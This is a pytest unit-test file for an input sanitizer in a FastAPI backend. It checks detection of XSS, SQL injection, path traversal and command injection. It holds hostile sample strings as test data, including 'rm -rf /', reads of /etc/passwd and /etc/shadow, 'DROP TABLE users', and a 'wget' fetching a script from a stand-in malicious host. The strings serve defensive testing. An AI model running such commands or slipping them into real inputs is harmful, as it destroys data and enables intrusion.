# File:
# /home/ubuntu/gold-price-predictor/backend/app/tests/test_input_sanitizer.py
"""
Unit Tests for Input Sanitization
"""

import pytest
from fastapi import HTTPException
from middleware.input_sanitizer import InputSanitizer, sanitize_input


class TestInputSanitizer:
    """Test Input Sanitization functionality"""

    def test_sanitize_html_escape(self):
        """Test HTML escaping"""
        input_text = "<script>alert('XSS')</script>"
        result = InputSanitizer.sanitize_html(input_text, allow_tags=False)
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_sanitize_html_with_allowed_tags(self):
        """Test HTML sanitization with allowed tags"""
        input_text = "<p>Hello</p><script>alert('XSS')</script>"
        result = InputSanitizer.sanitize_html(input_text, allow_tags=True)
        assert "<p>" in result
        assert "<script>" not in result

    def test_check_sql_injection_positive(self):
        """Test SQL injection detection (positive case)"""
        malicious_inputs = [
            "1' OR '1'='1",
            "admin'--",
            "1; DROP TABLE users",
            "UNION SELECT * FROM passwords",
        ]
        for input_text in malicious_inputs:
            assert InputSanitizer.check_sql_injection(input_text)

    def test_check_sql_injection_negative(self):
        """Test SQL injection detection (negative case)"""
        safe_inputs = [
            "John Doe",
            "user@example.com",
            "My favorite color is blue",
        ]
        for input_text in safe_inputs:
            assert InputSanitizer.check_sql_injection(input_text) == False

    def test_check_path_traversal_positive(self):
        """Test path traversal detection (positive case)"""
        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e/etc/shadow",
        ]
        for input_text in malicious_inputs:
            assert InputSanitizer.check_path_traversal(input_text)

    def test_check_path_traversal_negative(self):
        """Test path traversal detection (negative case)"""
        safe_inputs = [
            "/home/user/documents",
            "C:\\Users\\Documents",
            "file.txt",
        ]
        for input_text in safe_inputs:
            assert InputSanitizer.check_path_traversal(input_text) == False

    def test_check_command_injection_positive(self):
        """Test command injection detection (positive case)"""
        malicious_inputs = [
            "file.txt; rm -rf /",
            "data | cat /etc/passwd",
            "input && wget malicious.com/script.sh",
        ]
        for input_text in malicious_inputs:
            assert InputSanitizer.check_command_injection(input_text)

    def test_check_command_injection_negative(self):
        """Test command injection detection (negative case)"""
        safe_inputs = [
            "filename.txt",
            "user@domain.com",
            "normal text input",
        ]
        for input_text in safe_inputs:
            assert InputSanitizer.check_command_injection(input_text) == False

    def test_sanitize_string_strict_mode(self):
        """Test string sanitization in strict mode"""
        with pytest.raises(HTTPException) as exc_info:
            InputSanitizer.sanitize_string("1' OR '1'='1", strict=True)
        assert exc_info.value.status_code == 400

    def test_sanitize_string_non_strict_mode(self):
        """Test string sanitization in non-strict mode"""
        input_text = "<b>Bold text</b>"
        result = InputSanitizer.sanitize_string(input_text, strict=False)
        assert "<b>" not in result
        assert "&lt;b&gt;" in result

    def test_sanitize_dict(self):
        """Test dictionary sanitization"""
        input_dict = {
            "name": "<script>alert('XSS')</script>",
            "email": "user@example.com",
            "nested": {
                "field": "<b>test</b>"
            }
        }
        result = InputSanitizer.sanitize_dict(input_dict, strict=False)
        assert "<script>" not in result["name"]
        assert "<b>" not in result["nested"]["field"]
        assert result["email"] == "user@example.com"

    def test_sanitize_list(self):
        """Test list sanitization"""
        input_list = [
            "<script>XSS</script>",
            "safe text",
            {"key": "<b>value</b>"}
        ]
        result = InputSanitizer.sanitize_list(input_list, strict=False)
        assert "<script>" not in result[0]
        assert result[1] == "safe text"
        assert "<b>" not in result[2]["key"]

    def test_sanitize_input_utility_string(self):
        """Test sanitize_input utility with string"""
        result = sanitize_input("<p>Test</p>", strict=False)
        assert "&lt;p&gt;" in result

    def test_sanitize_input_utility_dict(self):
        """Test sanitize_input utility with dict"""
        input_data = {"field": "<script>XSS</script>"}
        result = sanitize_input(input_data, strict=False)
        assert "<script>" not in result["field"]

    def test_sanitize_input_utility_list(self):
        """Test sanitize_input utility with list"""
        input_data = ["<b>test</b>", "safe"]
        result = sanitize_input(input_data, strict=False)
        assert "<b>" not in result[0]

    def test_non_string_input(self):
        """Test handling of non-string input"""
        assert InputSanitizer.sanitize_string(123, strict=True) == 123
        assert InputSanitizer.check_sql_injection(None) == False

    def test_empty_string(self):
        """Test handling of empty string"""
        result = InputSanitizer.sanitize_string("", strict=True)
        assert result == ""

    def test_unicode_input(self):
        """Test handling of Unicode characters"""
        input_text = "مرحبا بك في النظام"
        result = InputSanitizer.sanitize_string(input_text, strict=False)
        assert result == input_text

    def test_nested_dict_sanitization(self):
        """Test deeply nested dictionary sanitization"""
        input_dict = {
            "level1": {
                "level2": {
                    "level3": "<script>XSS</script>"
                }
            }
        }
        result = InputSanitizer.sanitize_dict(input_dict, strict=False)
        assert "<script>" not in result["level1"]["level2"]["level3"]
